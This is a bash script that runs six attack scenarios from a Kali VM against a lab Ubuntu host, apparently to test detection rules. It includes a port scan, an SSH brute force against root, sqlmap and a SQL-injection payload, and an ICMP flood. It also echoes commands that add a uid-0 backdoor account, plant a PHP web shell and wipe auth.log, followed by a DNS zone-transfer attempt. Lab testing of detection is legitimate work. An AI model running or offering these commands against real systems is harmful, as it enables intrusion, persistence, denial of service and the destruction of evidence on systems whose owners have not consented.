#!/bin/bash
# 6 Attack Scenarios - Kali Linux VM4 -> VM2 Ubuntu 192.168.0.3
# Scenario 1 Port Scan
echo "[*] Scenario 1 Nmap SYN Scan" && nmap -sS -p 1-1024 192.168.0.3
# Scenario 2 SSH Brute
echo "[*] Scenario 2 SSH Brute Force" && hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://192.168.0.3
# Scenario 3 SQLi
echo "[*] Scenario 3 SQLMap" && sqlmap -u 'http://192.168.0.3/login.php?user=admin&pass=test' --dbs --batch --level=3 --risk=2
curl 'http://192.168.0.3/login.php?user=admin%27+OR+1%3D1--&pass=x'
# Scenario 4 ICMP Flood
echo "[*] Scenario 4 ICMP Flood 30 sec" && sudo timeout 30 hping3 --icmp --flood -V 192.168.0.3 || true
# Scenario 5 FIM - execute on VM2 console
echo "echo 'backdoor:x:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd"
echo "echo '<?php system(\$_GET[\"cmd\"]); ?>' | sudo tee /var/www/html/shell.php"
echo "sudo truncate -s 0 /var/log/auth.log # anti-forensics - triggers Rule 591"
# Scenario 6 DNS Enum
echo "[*] Scenario 6 DNS Enum" && dnsenum --dnsserver 192.168.0.3 enterprise.local && dig @192.168.0.3 enterprise.local AXFR
